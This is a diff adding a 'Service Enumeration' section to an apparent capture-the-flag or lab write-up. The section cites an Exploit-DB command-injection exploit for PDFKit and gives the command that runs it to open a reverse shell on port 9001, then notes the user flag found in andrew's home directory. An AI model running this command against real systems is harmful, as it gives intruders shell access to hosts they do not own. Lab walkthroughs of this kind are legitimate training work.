@@ -81,7 +81,15 @@ With this we get some information regardi the currently used packages. For examp
 
 # Service Enumeration 
 
+After searching for available exploits on exploitDB, we find the PDFKit is vulnerable to command injection. The link for gaining initial access can be found here -> https://www.exploit-db.com/exploits/51293
 
+The command necessary to run the script is below:
+
+		python3 51293.py -s 192.XXX.XXX.XX 9001 -w http://target.com:3000/pdf -p url
+
+Using this in conjunction with a listener on port 9001, gives us reverse shell access with a user named "andrew."
+
+In the /home/andrew/ directory, we find our first user flag in the, "local.txt" file.
 
 # Privilege Escalation
 
